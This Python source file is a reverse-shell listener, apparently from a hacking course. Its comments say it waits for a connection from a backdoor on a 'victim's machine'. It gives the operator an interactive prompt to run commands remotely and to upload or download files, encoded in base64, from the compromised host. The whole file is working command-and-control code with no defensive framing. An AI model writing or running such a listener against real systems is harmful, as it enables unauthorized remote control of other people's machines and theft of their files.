#!/usr/bin/env python
import optparse
import socket
import json
import base64

from pip._vendor.distlib.compat import raw_input


# this script waits for a reverse connection in case of backdoor on a victim's machine
# commands: - download, upload, cd, dir, cd .. etc

def getInput():
    parser = optparse.OptionParser(usage="Usage: listener [-i] [ipAddress] [-p] [port]\nUsage Example: "
                                         "\tlistener -i 10.0.2.6 -p 4444")
    parser.add_option("-i", "--ip", dest="ip", help="Specify ip address")
    parser.add_option("-p", "--port", dest="port", help="Specify port number")
    options = parser.parse_args()[0]
    return options


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # setting an option to the created socket so that it can be used again
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # binding with my local IP
        listener.bind((ip, port))

        # listen for incoming connection argument = no of connection that can be queued before current connection breaks
        listener.listen(0)
        print("[+] waiting for a connection")

        # accept incoming connection
        self.connection, address = listener.accept()
        print("[+] got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File downloaded"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    # [0] = command [1] = fileName [2] = fileContent
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                # checking if command was download, then writing the output stored in result
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

            except Exception:
                result = "[-] Error during command execution"

            print(result)


def main():
    options = getInput()
    if not options.ip:
        print("[-] Specify IP address")
    elif not options.port:
        print("[-] Specify port number")
    else:
        listener = Listener(options.ip, int(options.port))
        listener.run()


try:
    main()
except KeyboardInterrupt:
    print("[+] Quitting")
